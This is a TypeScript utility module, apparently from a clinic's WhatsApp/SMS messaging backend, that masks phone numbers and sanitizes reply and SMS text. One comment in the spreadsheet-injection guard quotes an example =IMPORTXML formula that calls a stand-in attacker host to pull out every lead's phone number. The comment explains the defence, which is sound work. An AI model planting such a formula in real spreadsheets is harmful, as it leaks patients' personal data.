export const SMS_MAX_CHARS = 120;

// Masks a phone-like value for console output, keeping only the last 4 digits
// ("whatsapp:+905551113049" → "***3049"). Log/console use ONLY — stored data
// (Redis state, Sheets rows, compliance keys) must keep the raw number.
export function maskPhone(phone: string): string {
  const digits = phone.replace(/\D/g, "");
  return `***${digits.slice(-4)}`;
}

// Spreadsheet formula-injection guard. Google Sheets and Excel evaluate any cell
// whose text starts with "=", "+", "-", "@", or a leading tab/CR as a live formula.
// Patient-supplied text reaches the leads sheet verbatim (name, notes,
// conversation_summary), so a message like
//   =IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",D:D)),"//a")
// would execute the moment the clinic opens the sheet and exfiltrate every lead's
// phone number. Prefixing with a single quote forces Sheets to store and render the
// value as literal text. This is the second layer — writes must ALSO use
// valueInputOption "RAW" (see lib/googleSheets.ts), which stops evaluation at the
// API boundary. Values that do not start with a trigger character pass through
// unchanged, so this is a no-op for ordinary text.
export function sanitizeSpreadsheetCell(value: string): string {
  if (!value) return value;
  return /^[=+\-@\t\r]/.test(value) ? `\x27${value}` : value;
}

const APO = "\x27";

const CONTRACTIONS: Array<[RegExp, string]> = [
  [new RegExp("\\bcan" + APO + "t\\b", "gi"), "cannot"],
  [new RegExp("\\bwon" + APO + "t\\b", "gi"), "will not"],
  [new RegExp("\\bdon" + APO + "t\\b", "gi"), "do not"],
  [new RegExp("\\bdoesn" + APO + "t\\b", "gi"), "does not"],
  [new RegExp("\\bdidn" + APO + "t\\b", "gi"), "did not"],
  [new RegExp("\\bisn" + APO + "t\\b", "gi"), "is not"],
  [new RegExp("\\baren" + APO + "t\\b", "gi"), "are not"],
  [new RegExp("\\bwasn" + APO + "t\\b", "gi"), "was not"],
  [new RegExp("\\bweren" + APO + "t\\b", "gi"), "were not"],
  [new RegExp("\\bhasn" + APO + "t\\b", "gi"), "has not"],
  [new RegExp("\\bhaven" + APO + "t\\b", "gi"), "have not"],
  [new RegExp("\\bhadn" + APO + "t\\b", "gi"), "had not"],
  [new RegExp("\\bshouldn" + APO + "t\\b", "gi"), "should not"],
  [new RegExp("\\bwouldn" + APO + "t\\b", "gi"), "would not"],
  [new RegExp("\\bcouldn" + APO + "t\\b", "gi"), "could not"],
];

// Turkish characters to preserve (Ç ç Ğ ğ İ ı Ö ö Ş ş Ü ü)
const TURKISH_CHARS = "ÇçĞğİıÖöŞşÜü";

// Strips Markdown constructs that WhatsApp renders as literal artifacts.
// Must run BEFORE newline collapsing — heading/bullet markers are anchored to line starts.
// [label](url) becomes "label: url" so links stay readable as plain text.
function stripMarkdownArtifacts(text: string): string {
  let s = text;
  s = s.replace(/```[a-zA-Z]*\n?/g, " ");                 // code fences
  s = s.replace(/`([^`]*)`/g, "$1");                       // inline code
  s = s.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, "$1: $2");   // [Google Maps](url) → Google Maps: url
  s = s.replace(/\*\*([^*]+)\*\*/g, "$1");                 // **bold** → bold (single *bold* is WhatsApp-native)
  s = s.replace(/__([^_]+)__/g, "$1");                     // __bold__ → bold
  s = s.replace(/^[ \t]*#{1,6}[ \t]+/gm, "");              // headings
  s = s.replace(/^[ \t]*[-*•][ \t]+/gm, "");               // bullet list markers
  s = s.replace(/^[ \t]*>[ \t]+/gm, "");                   // blockquotes
  return s;
}

function sanitizeBase(text: string): string {
  let s = text;

  s = s.replace(/['']/g, "\x27");
  s = s.replace(/[""]/g, "\x22");

  for (const [pattern, replacement] of CONTRACTIONS) {
    s = s.replace(pattern, replacement);
  }

  s = stripMarkdownArtifacts(s);

  s = s.replace(/[—–―]/g, "-");
  s = s.replace(/…/g, "...");
  s = s.replace(/[\r\n\t]+/g, " ");

  // Remove control characters and invisible formatting chars. Printable text in ALL
  // supported languages (Turkish, Arabic, Cyrillic, accented Latin) passes through —
  // multilingual replies must never be blanked here. Apostrophes are preserved so
  // Turkish suffixes stay correct ("2.500 TL'den", never "2.500den").
  s = s.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F\u200B-\u200F\u2028\u2029\u2060\uFEFF]/g, "");

  s = s.replace(/ {2,}/g, " ").trim();

  return s;
}

// Filters markdown/control characters but preserves ALL languages' letters and does NOT
// truncate — use for AI/WhatsApp replies stored in history or returned to non-SMS
// endpoints. SMS charset filtering and truncation are applied only at SMS send time.
export function sanitizeReplyText(text: string): string {
  return sanitizeBase(text);
}

// Ensures "Welcome to {clinicName}" is followed by a period before the next sentence.
// Fixes AI-generated replies that omit sentence-terminal punctuation after the clinic name.
// Only acts when the clinic name is immediately followed by a space and a letter (no existing punctuation).
export function ensureClinicNamePunctuation(text: string, clinicName: string): string {
  if (!clinicName || clinicName === "the clinic") return text;
  const escaped = clinicName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const re = new RegExp(`(Welcome to ${escaped}) ([A-Za-zÇçĞğİıÖöŞşÜü])`, "g");
  return text.replace(re, "$1. $2");
}

// SMS transport sanitization: GSM-safe charset (ASCII + Turkish letters, emoji stripped)
// and hard length cap. Applied at SMS send time only — WhatsApp replies keep full
// multilingual text via sanitizeReplyText.
export function sanitizeSmsText(text: string): string {
  let s = sanitizeBase(text);
  s = s.replace(new RegExp(`[^\\x20-\\x7E${TURKISH_CHARS}]`, "g"), "");
  s = s.replace(/ {2,}/g, " ").trim();
  return s.length > SMS_MAX_CHARS ? s.slice(0, SMS_MAX_CHARS) : s;
}
